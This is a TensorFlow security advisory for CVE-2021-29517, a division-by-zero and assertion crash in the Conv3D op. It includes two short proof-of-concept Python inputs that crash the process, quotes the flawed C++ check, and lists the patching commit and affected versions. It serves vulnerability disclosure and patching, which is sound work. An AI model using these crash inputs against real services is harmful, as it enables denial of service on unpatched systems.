## TFSA-2021-006: Division by zero in `Conv3D`

### CVE Number
CVE-2021-29517

### Impact
A malicious user could trigger a division by 0 in `Conv3D` implementation:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/42033603003965bffac51ae171b51801565e002d/tensorflow/core/kernels/conv_ops_3d.cc#L143-L145) does a modulo operation based on user controlled input:

```cc
  const int64 out_depth = filter.dim_size(4);
  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);
```

Thus, when `filter` has a 0 as the fifth element, this results in a division by 0.

Additionally, if the shape of the two tensors is not valid, an Eigen assertion
can be triggered, resulting in a program crash:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

The shape of the two tensors must follow the constraints specified in the [op
description](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Conv3D).

### Patches
We have patched the issue in GitHub commit
[799f835a3dfa00a4d852defa29b15841eea9d64f](https://github.com/tensorflow/tensorflow/commit/799f835a3dfa00a4d852defa29b15841eea9d64f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
